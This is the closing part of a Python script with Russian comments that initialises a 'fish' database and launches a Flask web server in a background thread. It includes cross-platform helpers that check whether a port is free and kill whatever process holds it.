    if FISH_ENABLED:
        try:
            fish_db.init_db()
            from fish_web import app as fish_app

            import socket as _sock
            import time as _t

            _p = _fish_cfg.SERVER_PORT

            def _kill_port(port):
                """Убиваем процесс занявший порт — кросс-платформенно."""
                import sys as _sys2

                if _sys2.platform == 'win32':
                    # Windows: netstat + taskkill
                    try:
                        import subprocess as _sp2
                        r = _sp2.run(
                            ['netstat', '-ano', '-p', 'TCP'],
                            capture_output=True, text=True, timeout=5
                        )
                        for line in r.stdout.splitlines():
                            if f':{port} ' in line and 'LISTENING' in line:
                                pid = line.strip().split()[-1]
                                if pid.isdigit():
                                    _sp2.run(['taskkill', '/F', '/PID', pid],
                                              capture_output=True, timeout=3)
                    except Exception:
                        pass
                    return

                # Linux/macOS: fuser → /proc → lsof
                try:
                    subprocess.run(
                        ["fuser", "-k", "{}/tcp".format(port)],
                        capture_output=True, timeout=5
                    )
                except Exception:
                    pass
                # /proc (Linux)
                try:
                    inode_target = None
                    with open("/proc/net/tcp", "r") as _pf:
                        for line in _pf:
                            parts = line.split()
                            if len(parts) < 4:
                                continue
                            local = parts[1]
                            hex_port = local.split(":")[1] if ":" in local else ""
                            if hex_port and int(hex_port, 16) == port:
                                inode_target = parts[9] if len(parts) > 9 else None
                                break
                    if inode_target:
                        import os as _os
                        for pid in _os.listdir("/proc"):
                            if not pid.isdigit():
                                continue
                            fd_dir = "/proc/{}/fd".format(pid)
                            try:
                                for fd in _os.listdir(fd_dir):
                                    link = _os.readlink("{}/{}".format(fd_dir, fd))
                                    if "socket:[{}]".format(inode_target) in link:
                                        _os.kill(int(pid), 9)
                                        break
                            except Exception:
                                continue
                except Exception:
                    pass
                # lsof fallback (macOS / Linux)
                try:
                    import subprocess as _sp3
                    r = _sp3.run(['lsof', '-ti', f'tcp:{port}'],
                                 capture_output=True, text=True, timeout=5)
                    for pid_str in r.stdout.split():
                        if pid_str.isdigit():
                            _os.kill(int(pid_str), 9)
                except Exception:
                    pass

            def _port_free(port):
                """
                Честная проверка: свободен ли порт для нового процесса.

                ВАЖНО: НЕ используем SO_REUSEPORT здесь — иначе тест даёт
                ложноположительный результат. Flask (Werkzeug) создаёт сокет
                без SO_REUSEPORT, поэтому тест должен имитировать именно его
                поведение. Только SO_REUSEADDR — чтобы игнорировать TIME_WAIT
                так же как это делает Werkzeug по умолчанию.
                """
                with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
                    s.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
                    try:
                        s.bind(("0.0.0.0", port))
                        return True
                    except OSError:
                        return False

            # В Docker убивать процессы по порту не нужно — просто ждём
            if not _port_free(_p):
                print(f"  ⚠️ Порт {_p} занят, жду освобождения...", flush=True)
                freed = False
                for _attempt in range(15):
                    _t.sleep(1)
                    if _port_free(_p):
                        freed = True
                        print(f"  ✅ Порт {_p} свободен", flush=True)
                        break
                if not freed:
                    print(f"  ⚠️ Порт {_p} всё ещё занят — Flask попробует запустить с SO_REUSEADDR", flush=True)

            if not fish_bot_state.server_running:
                def _run_fish_flask():
                    fish_bot_state.server_running = True
                    try:
                        # В Docker используем SO_REUSEPORT чтобы не ждать TIME_WAIT
                        import socket as _s2
                        flask_sock = _s2.socket(_s2.AF_INET, _s2.SOCK_STREAM)
                        flask_sock.setsockopt(_s2.SOL_SOCKET, _s2.SO_REUSEADDR, 1)
                        try:
                            flask_sock.setsockopt(_s2.SOL_SOCKET, _s2.SO_REUSEPORT, 1)
                        except (AttributeError, OSError):
                            pass  # Windows не поддерживает SO_REUSEPORT
                        flask_sock.close()
                        fish_app.run(
                            host=_fish_cfg.SERVER_HOST,
                            port=_p,
                            debug=False, threaded=True, use_reloader=False
                        )
                    except OSError as flask_err:
                        # Последний шанс — пробуем ещё раз через секунду
                        # (TIME_WAIT мог только что истечь)
                        print(f"  ⚠️ Flask: {flask_err}, повторная попытка через 3 сек...", flush=True)
                        _t.sleep(3)
                        try:
                            fish_app.run(
                                host=_fish_cfg.SERVER_HOST,
                                port=_p,
                                debug=False, threaded=True, use_reloader=False
                            )
                        except Exception as e2:
                            print(f"  ❌ Flask не запустился: {e2}", flush=True)
                    finally:
                        fish_bot_state.server_running = False

                threading.Thread(target=_run_fish_flask, daemon=True, name="fish-flask-auto").start()
                print(f"  🎣 Fish Flask запускается на порту {_p}...", flush=True)
        except Exception as _fe:
            print(f"  ⚠️ Fish Flask не запустился: {_fe}", flush=True)

    poll()

if __name__ == '__main__':
    main()